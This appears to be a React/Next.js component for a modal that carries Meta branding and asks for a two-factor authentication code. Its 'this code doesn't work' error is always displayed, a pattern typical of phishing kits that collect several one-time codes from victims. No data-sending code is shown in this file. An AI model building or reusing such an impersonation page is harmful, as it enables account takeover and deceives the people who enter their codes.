import MetaLogo from '@/assets/images/meta-logo-image.png';
import VerifyImage from '@/assets/images/verify-image.png';
import Image from 'next/image';
import type { FC } from 'react';
const VerifyModal: FC = () => {
    return (
        <div className='fixed inset-0 z-10 flex h-screen w-screen items-center justify-center bg-black/40 px-4'>
            <div className='flex max-h-[90vh] w-full max-w-xl flex-col gap-7 rounded-3xl bg-linear-to-br from-[#FCF3F8] to-[#EEFBF3] p-4'>
                <p className='mt-4 text-2xl font-bold'>Check your authentication code</p>
                <p className='text-xl'>Enter the 6-digit code for this account from the two-factor authentication you set up (such as Google Authenticator, email or text message on your mobile).</p>
                <div className='flex flex-col justify-center'>
                    <Image src={VerifyImage} alt='' />
                    <div className='relative mt-4 w-full'>
                        <input type='text' id='code-input' className='peer h-[60px] w-full rounded-[10px] border-2 border-[#d4dbe3] px-3 pt-6 pb-2 placeholder-transparent focus:outline-none' placeholder='Code' />
                        <label htmlFor='code-input' className='absolute top-1/2 left-3 -translate-y-1/2 cursor-text text-[#4a4a4a] transition-all duration-200 ease-in-out peer-placeholder-shown:top-1/2 peer-placeholder-shown:-translate-y-1/2 peer-placeholder-shown:text-base peer-focus:top-2 peer-focus:translate-y-0 peer-focus:text-xs peer-[:not(:placeholder-shown)]:top-2 peer-[:not(:placeholder-shown)]:translate-y-0 peer-[:not(:placeholder-shown)]:text-xs'>
                            Code
                        </label>
                    </div>
                    <p className='mt-2 text-[15px] text-red-500'>This code doesn’t work. Check it’s correct or try a new one after 60s.</p>
                    <button type='submit' className='mt-4 flex h-[50px] w-full items-center justify-center rounded-full bg-blue-600 font-semibold text-white transition-colors hover:bg-blue-700'>
                        Continue
                    </button>
                </div>
                <div className='flex items-center justify-center p-3'>
                    <Image src={MetaLogo} alt='' className='h-[18px] w-[70px]' />
                </div>
            </div>
        </div>
    );
};

export default VerifyModal;
